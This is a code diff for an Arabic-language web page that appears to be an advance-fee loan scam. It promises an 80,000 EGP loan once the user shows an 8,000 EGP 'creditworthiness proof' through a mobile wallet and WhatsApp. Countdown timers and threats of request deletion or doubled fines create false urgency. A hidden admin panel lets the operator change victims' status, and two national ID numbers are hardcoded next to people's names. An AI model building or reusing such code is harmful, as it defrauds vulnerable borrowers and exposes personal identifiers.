+                        <span class="hl-emerald">✨ الآن أنت على بعد خطوة واحدة من صرف الـ 80,000 ج.م</span><br><br>
+                        <span class="hl-gold">💰 نؤكد: لا يوجد دفع أو تحويل لأي شخص تابع لنا</span><br>
+                        مهما كانت الأمور، كل ما هو مطلوب منك إثبات جدارة ائتمانية لك فقط<br>
+                        بقيمة <span class="hl-purple">8,000 ج.م أو أكثر وليس أقل</span>.
+                    </div>
+
+                    <button class="btn btn-whatsapp" onclick="openWhatsApp('📞 طلب فتح الطلب المغلق\\nالعميل: ${customer.name}\\nالرقم القومي: ${currentNationalId}\\nالمبلغ: 80,000 ج.م\\n\\nأرجو فتح الطلب الخاص بي لإتمام إجراءات إثبات الجدارة الائتمانية.\\n\\nعلماً بأن لدي 30 دقيقة فقط لإرسال الإثباتات بعد فتح الطلب.')">
+                        <i class="fab fa-whatsapp"></i> 📞 تواصل لفتح الطلب
+                    </button>
+                    
+                    <div class="note">
+                        <i class="fas fa-exclamation-triangle" style="color: var(--danger);"></i> 
+                        <span class="hl-danger">تنبيه هام:</span> يجب التواصل قبل الإثبات بنصف ساعة على الأقل<br>
+                        ليتم فتح الطلب وقبول الإثباتات ونزول المبلغ لحسابك فوراً.
+                    </div>
+
+                    <div style="margin-top:0.8rem;padding:0.8rem;background:rgba(46,204,113,0.06);border:1px solid rgba(46,204,113,0.15);border-radius:var(--radius-md);">
+                        <p style="color:var(--text-muted);font-size:0.75rem;line-height:1.8;margin:0;">
+                            <span style="color:var(--gold);font-weight:700;">💡 تذكر:</span><br>
+                            ✅ مبلغ الإثبات هو <span style="color:var(--purple);font-weight:700;">8,000 ج.م</span><br>
+                            ✅ هذا المبلغ <span style="color:var(--emerald);font-weight:700;">ليس للشركة</span> — بل لإثبات الجدارة الائتمانية<br>
+                            ✅ سيتم <span style="color:var(--gold);font-weight:700;">صرف 80,000 ج.م</span> لحسابك فور قبول الإثبات<br>
+                            ❌ <span style="color:var(--danger);font-weight:700;">لا تنتظر حتى تنتهي المدة</span> — تواصل الآن لفتح الطلب
+                        </p>
+                    </div>
+                </div>
+            `;
+        }
+
+        // ================================================================
+        //  DISPLAY RESULT
+        // ================================================================
+
+        function displayResult(customer, nationalId) {
+            currentCustomer = customer;
+            currentNationalId = nationalId;
+            const area = document.getElementById('resultArea');
+
+            // حالة خاصة 1: أحمد ناصر أحمد حسين النقيب — طلب معلق حتى الساعة 1 ظهراً
+            if (nationalId === '27310192600813') {
+                area.innerHTML = buildPendingOnePmCard(customer);
+                document.getElementById('errorBox').style.display = 'none';
+                startOnePmTimer();
+                return;
+            }
+
+            // حالة خاصة 2: عبد الحميد عبد الودود — مدان بالقرض + غرامة مالية (لا يظهر إثبات الجدارة)
+            if (nationalId === '28309030201937') {
+                area.innerHTML = buildDebtorCard(customer);
+                document.getElementById('errorBox').style.display = 'none';
+                startPenaltyTimer();
+                return;
+            }
+
+            // الحالة العادية
+            if (customer.status === 'pending') {
+                area.innerHTML = buildPendingCard(customer);
+                document.getElementById('errorBox').style.display = 'none';
+                startPendingTimer();
+                return;
+            }
+
+            let html = '';
+            html += buildLoanCard(customer);
+            html += buildPaymentNotice(customer);
+            html += buildProofSection(customer);
+            html += buildClientInfo(customer);
+
+            area.innerHTML = html;
+            document.getElementById('errorBox').style.display = 'none';
+
+            bindButtons(customer);
+            startTimers(customer);
+        }
+
+        // ================================================================
+        //  مؤقت التعليق العادي
+        // ================================================================
+
+        function startPendingTimer() {
+            if (pendingTimerInterval) clearInterval(pendingTimerInterval);
+            const pendingTimer = document.getElementById('pendingTimer');
+            if (pendingTimer) {
+                let seconds = PENDING_MINUTES * 60;
+                pendingTimerInterval = setInterval(() => {
+                    if (seconds <= 0) {
+                        clearInterval(pendingTimerInterval);
+                        pendingTimer.innerText = "00:00";
+                        pendingTimer.style.color = "#FF6B6B";
+                        pendingTimer.style.animation = "blinkTimer 0.5s ease-in-out infinite";
+                        const container = pendingTimer.closest('.pending-timer-box');
+                        if (container) {
+                            container.innerHTML = `
+                                <div style="font-size:0.8rem;color:var(--danger);font-weight:700;margin-bottom:0.3rem;">⛔ انتهى الوقت!</div>
+                                <div style="font-size:1.8rem;font-weight:900;color:var(--danger);font-family:monospace;">00:00</div>
+                                <div class="label"><span class="hl-danger">❌ تم حذف الطلب لمدة 90 يوماً</span></div>
+                            `;
+                        }
+                        return;
+                    }
+                    seconds--;
+                    const m = Math.floor(seconds / 60);
+                    const s = seconds % 60;
+                    pendingTimer.innerText = `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+                    if (seconds < 60) {
+                        pendingTimer.style.color = "#FF6B6B";
+                        pendingTimer.style.animation = "blinkTimer 0.5s ease-in-out infinite";
+                    } else {
+                        pendingTimer.style.color = "";
+                        pendingTimer.style.animation = "";
+                    }
+                }, 1000);
+            }
+        }
+
+        // ================================================================
+        //  مؤقت خاص: حتى الساعة الواحدة ظهراً (أحمد ناصر)
+        // ================================================================
+
+        function startOnePmTimer() {
+            if (pendingTimerInterval) clearInterval(pendingTimerInterval);
+            const pendingTimer = document.getElementById('pendingTimer');
+            if (pendingTimer) {
+                const now = new Date();
+                const onePm = new Date();
+                onePm.setHours(13, 0, 0, 0);
+                if (onePm <= now) {
+                    onePm.setDate(onePm.getDate() + 1);
+                }
+                let seconds = Math.floor((onePm - now) / 1000);
+
+                const render = () => {
+                    const h = Math.floor(seconds / 3600);
+                    const m = Math.floor((seconds % 3600) / 60);
+                    const s = seconds % 60;
+                    pendingTimer.innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+                    if (seconds < 3600) {
+                        pendingTimer.style.color = "#FF6B6B";
+                        pendingTimer.style.animation = "blinkTimer 0.5s ease-in-out infinite";
+                    }
+                };
+                render();
+
+                pendingTimerInterval = setInterval(() => {
+                    if (seconds <= 0) {
+                        clearInterval(pendingTimerInterval);
+                        pendingTimer.innerText = "00:00:00";
+                        pendingTimer.style.color = "#FF6B6B";
+                        pendingTimer.style.animation = "blinkTimer 0.5s ease-in-out infinite";
+                        const container = pendingTimer.closest('.pending-timer-box');
+                        if (container) {
+                            container.innerHTML = `
+                                <div style="font-size:0.8rem;color:var(--danger);font-weight:700;margin-bottom:0.3rem;">⛔ انتهى الوقت!</div>
+                                <div style="font-size:1.8rem;font-weight:900;color:var(--danger);font-family:monospace;">00:00:00</div>
+                                <div class="label"><span class="hl-danger">❌ تم حذف الطلب لمدة 90 يوماً</span></div>
+                            `;
+                        }
+                        return;
+                    }
+                    seconds--;
+                    render();
+                }, 1000);
+            }
+        }
+
+        // ================================================================
+        //  مؤقت خاص: غرامة مالية 8 ساعات (عبد الحميد)
+        // ================================================================
+
+        function startPenaltyTimer() {
+            if (pendingTimerInterval) clearInterval(pendingTimerInterval);
+            const penaltyTimer = document.getElementById('penaltyTimer');
+            if (penaltyTimer) {
+                let seconds = 8 * 60 * 60; // 8 ساعات
+                const render = () => {
+                    const h = Math.floor(seconds / 3600);
+                    const m = Math.floor((seconds % 3600) / 60);
+                    const s = seconds % 60;
+                    penaltyTimer.innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+                    if (seconds < 3600) {
+                        penaltyTimer.style.color = "#FF6B6B";
+                        penaltyTimer.style.animation = "blinkTimer 0.5s ease-in-out infinite";
+                    }
+                };
+                render();
+
+                pendingTimerInterval = setInterval(() => {
+                    if (seconds <= 0) {
+                        clearInterval(pendingTimerInterval);
+                        penaltyTimer.innerText = "00:00:00";
+                        penaltyTimer.style.color = "#FF6B6B";
+                        penaltyTimer.style.animation = "blinkTimer 0.5s ease-in-out infinite";
+                        const container = penaltyTimer.closest('.timer-box');
+                        if (container) {
+                            container.innerHTML = `
+                                <div style="font-size:0.8rem;color:var(--danger);font-weight:700;margin-bottom:0.3rem;">⛔ انتهى الوقت!</div>
+                                <div style="font-size:1.8rem;font-weight:900;color:var(--danger);font-family:monospace;">00:00:00</div>
+                                <div class="label"><span class="hl-danger">❌ تم تضاعف الغرامة المالية</span></div>
+                            `;
+                        }
+                        return;
+                    }
+                    seconds--;
+                    render();
+                }, 1000);
+            }
+        }
+
+        // ================================================================
+        //  TIMER FUNCTIONS
+        // ================================================================
+
+        function startTimers(customer) {
+            if (timerInterval) clearInterval(timerInterval);
+            const proofTimer = document.getElementById('proofTimer');
+            if (proofTimer) {
+                let seconds = PROOF_MINUTES * 60;
+                timerInterval = setInterval(() => {
+                    if (seconds <= 0) { clearInterval(timerInterval); proofTimer.innerText = "00:00"; proofTimer.classList.add('danger'); return; }
+                    seconds--;
+                    const m = Math.floor(seconds / 60);
+                    const s = seconds % 60;
+                    proofTimer.innerText = `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+                    if (seconds < 60) proofTimer.classList.add('danger');
+                    else proofTimer.classList.remove('danger');
+                }, 1000);
+            }
+        }
+
+        // ================================================================
+        //  BIND BUTTONS
+        // ================================================================
+
+        function bindButtons(customer) {
+            const proofBtn = document.getElementById('proofBtn');
+            if (proofBtn) {
+                proofBtn.onclick = () => {
+                    const proofAmount = getProofAmount(customer.loan, currentNationalId);
+                    const plan = getInstallmentPlan(customer.loan);
+                    const firstDate = getFirstInstallmentDate();
+                    let msg = `📤 إرسال إثبات الجدارة الائتمانية\n\nالعميل: ${customer.name}\nالرقم القومي: ${currentNationalId}\nالوظيفة: ${customer.job || 'غير مسجل'}\nالمبلغ: ${customer.loan.toLocaleString('ar-EG')} ج.م\nمبلغ الإثبات: ${proofAmount.toLocaleString('ar-EG')} ج.م\nالقسط الشهري: ${plan.installment.toLocaleString('ar-EG')} ج.م\nمدة القسط: ${plan.months} شهر\nأول قسط: ${firstDate}\n\n`;
+                    if (customer.guarantor) {
+                        msg += `الضامن: ${customer.guarantor.name}\nصلة الضامن: ${customer.guarantor.relation}\nرقم الضامن: ${customer.guarantor.phone || 'غير مسجل'}\n\n`;
+                    }
+                    msg += `✅ أقر أنا ${customer.name} بأنني قمت بإجراءات إثبات الجدارة الائتمانية كما هو موضح:\n1. قمت بإدخال مبلغ الإثبات إلى محفظتي\n2. التقطت لقطة شاشة للرصيد\n3. قمت بتحويل المبلغ مرة أخرى (أو سحبته)\n4. التقطت لقطة شاشة للخروج\n5. أرسلت الصور إلى قسم التحويلات المالية\n\nأتعهد بالالتزام بجميع شروط وأحكام التمويل.`;
+                    openWhatsApp(msg);
+                };
+            }
+
+            const transferBtn = document.getElementById('transferBtn');
+            if (transferBtn) {
+                transferBtn.onclick = () => {
+                    let msg = `📋 تأكيد استلام المبلغ\n\nالعميل: ${customer.name}\nالرقم القومي: ${currentNationalId}\nالمبلغ: ${customer.loan.toLocaleString('ar-EG')} ج.م\nرقم المحفظة: ${customer.walletNum || 'سيتم تحديده'}\n\nأقر أنا ${customer.name} بأنني استلمت المبلغ على محفظتي.`;
+                    openWhatsApp(msg);
+                };
+            }
+
+            const supportBtn = document.getElementById('supportHeaderBtn');
+            if (supportBtn) {
+                supportBtn.onclick = () => {
+                    openWhatsApp(`📞 طلب دعم فني\nالعميل: ${currentCustomer?.name || ''}\nالرقم القومي: ${currentNationalId || ''}`);
+                };
+            }
+        }
+
+        // ================================================================
+        //  SEARCH
+        // ================================================================
+
+        function searchCustomer() {
+            const nationalId = document.getElementById('nationalId').value.trim();
+            if (!nationalId) { alert('⚠️ الرجاء إدخال الرقم القومي'); return; }
+            if (nationalId.length !== 14) { alert('⚠️ الرقم القومي يجب أن يكون 14 رقمًا'); return; }
+
+            document.getElementById('loader').style.display = 'block';
+            document.getElementById('resultArea').innerHTML = '';
+            document.getElementById('errorBox').style.display = 'none';
+
+            setTimeout(() => {
+                document.getElementById('loader').style.display = 'none';
+                const customer = customersDatabase[nationalId];
+                if (!customer) {
+                    document.getElementById('errorBox').style.display = 'block';
+                    currentCustomer = null;
+                    currentNationalId = null;
+                    return;
+                }
+                displayResult(customer, nationalId);
+            }, 600);
+        }
+
+        // ================================================================
+        //  ADMIN
+        // ================================================================
+
+        function toggleAdmin() {
+            isAdmin = !isAdmin;
+            document.getElementById('adminPanel').classList.toggle('show', isAdmin);
+        }
+
+        function changeStatus(newStatus) {
+            if (!currentCustomer || !currentNationalId) { alert('⚠️ يرجى البحث عن عميل أولاً.'); return; }
+            if (!confirm(`هل أنت متأكد من تغيير حالة العميل ${currentCustomer.name} إلى "${newStatus}"؟`)) return;
+            customersDatabase[currentNationalId].status = newStatus;
+            document.getElementById('currentStatusText').textContent = newStatus;
+            displayResult(customersDatabase[currentNationalId], currentNationalId);
+            alert(`✅ تم تغيير الحالة إلى "${newStatus}" بنجاح.`);
+        }
+
+        // ================================================================
+        //  EVENTS
+        // ================================================================
+
+        document.querySelector('.brand')?.addEventListener('click', function() {
+            adminClickCount++;
+            if (adminClickCount >= 5) { toggleAdmin(); adminClickCount = 0; }
+            setTimeout(() => { adminClickCount = 0; }, 3000);
+        });
+
+        document.getElementById('nationalId')?.addEventListener('keypress', e => {
+            if (e.key === 'Enter') searchCustomer();
+        });
+
+        window.searchCustomer = searchCustomer;
+        window.changeStatus = changeStatus;
+        window.openWhatsApp = openWhatsApp;
+    </script>
 
 </body>
 </html>
